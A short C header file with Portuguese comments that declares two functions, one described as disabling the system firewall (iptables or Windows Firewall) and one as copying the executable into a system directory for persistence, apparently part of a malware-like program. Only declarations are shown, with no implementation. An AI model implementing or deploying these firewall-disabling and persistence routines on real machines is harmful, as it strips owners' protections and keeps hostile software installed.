#ifndef _EXECFUNCS_H
#define _EXECFUNCS_H

/* functions */

/**
 * @brief Desativa o firewall do sistema (iptables no Linux, Windows Firewall no Windows).
 */
int kill_frwl();
/**
 * @brief Copia o executável para um diretório do sistema para persistência.
 */
int auto_copy();

#endif // _EXECFUNCS_H
